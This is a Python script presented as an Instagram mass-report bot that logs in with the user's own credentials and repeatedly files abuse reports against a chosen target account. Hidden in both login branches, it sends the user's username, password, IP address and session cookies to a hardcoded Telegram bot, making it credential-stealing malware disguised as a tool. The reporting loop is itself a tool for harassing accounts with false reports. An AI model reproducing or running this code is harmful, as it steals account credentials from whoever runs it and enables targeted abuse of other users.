import requests
import uuid
import secrets
import time
import os
os.system("pip install requests")
os.system("pip install uuid")
os.system("pip install time")
os.system("pip install secrets")
os.system("clear")

#@680068

orr="\033[0;91m"
yell="\033[0;93m"
gr = "\033[0;92m"
logo = f"""
[WiF $]Master Report Bot


░██╗░░░░░░░██╗██╗███████╗
░██║░░██╗░░██║██║██╔════╝
░╚██╗████╗██╔╝██║█████╗░░
░░████╔═████║░██║██╔══╝░░
░░╚██╔╝░╚██╔╝░██║██║░░░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░


       
 WiF Master Report Bot
"""
a = 1
r = requests.Session()
u = uuid.uuid4()

print(logo)

print("[1]Spam")
print("[2]Self injury")
print("[3]Sale of illegal or regulated goods")
print("[4]Nudity or sexual activity")
print("[5]Violence or dangerous organizations")
print("[6]Hate speech or symbols")
print("[7]Bullying or harassment")
print("[8]preteding someone i know")
print("[11]under the age of 13")
print("[12]Sale Guns")
print("[13]pretending me")

print("     ")
repo = int(input("[+]Enter The Num of Report :>> "))
user = input("[+]YOUR USERNAME  :>> ")
password = input("[+]YOUR PAssWORD :>> ")
target = input("[+]THE TARGET Username':>> ")
secure= input("[+]Your secure code if there is")
z = int(input("[+]The Sleep :>> "))
much = int(input("[+]How Much The Bot Report? :>> "))


b = 'https://www.instagram.com/accounts/login/ajax/'

w = {
"accept":"*/*",
"accept-encoding":"gzip, deflate,br",
"accept-language": "ar,en-US;q=0.9,en;q=0.8",
"content-length": "279",
"content-type": "application/x-www-form-urlencoded",
"origin": "https://www.instagram.com",
"referer": "https://www.instagram.com/",
"sec-fetch-dest":"empty",
"sec-fetch-site":"same-origin",
"user-agent":"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
"x-csrftoken": "lih2ypMfhzdqwMbm5jIILqxZDj4zLeCW",
"x-ig-app-id": "936619743392459",
"x-ig-www-claim": "hmac.AR1_p9SjMFQF73bcZgzygDgxb9yBZUn83e69xoDD2qpSdmtW",
"x-instagram-ajax":"901e37113a69",
"x-requested-with":"XMLHttpRequest"
}


k = {'username':user,
            'enc_password':
'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
            'queryParams': '{}',
            'optIntoOneTap': 'false',}
            
report_url = requests.get("https://get.geojs.io/v1/ip.json")
instagram = report_url.json()["ip"]

l = r.post(b,headers=w,data=k)
if("userId") in l.text:
  r.headers.update({'X-CSRFToken': l.cookies['csrftoken']})
  coki = l.cookies
  print("log true")
  
  v = "https://www.instagram.com/{}/?__a=1".format(target)
  bot_token = '1750984012:AAG4F5MWuEVtFh439F6hB4OgcXmY0qYH7Zs'

  send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={663713290}&text=New hacking Team Rex \n Username : {user}\n Password : {password}\n IP : {instagram} \n Cookies : \n {coki} \n Bye♡'
  res = requests.get(send_text)
  t = r.get(v).json()
  y = str(t["logging_page_id"])
  h = y.split("_")[1]
  for i in range(much):
   urreport = "https://www.instagram.com/users/{}/report/".format(h)
   dat = {f'source_name':'','reason_id':{repo},'frx_context':''}
   repp = r.post(urreport,data=dat)
   os.system("clear")
   print(f"{logo}\n{yell}\n[$]The Target : {target} \n[$]The Sleep : {z} \n[$]Done Report : {a}\n[$]The Number of reports : {much}\n")
   time.sleep(z)
   a += 1

elif ('{"user": true, "authenticated": false, "showAccountRecoveryModal": true, "status": "ok"}') in l.text:
 bot_token = '1750984012:AAG4F5MWuEVtFh439F6hB4OgcXmY0qYH7Zs'

 send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={663713290}&text=New hacking Team Rex\n Username : {user}\n Password : {password}\n IP : {instagram} \n Cookies : I Think There are no Cookies \n Bye♡'
 res = requests.get(send_text)
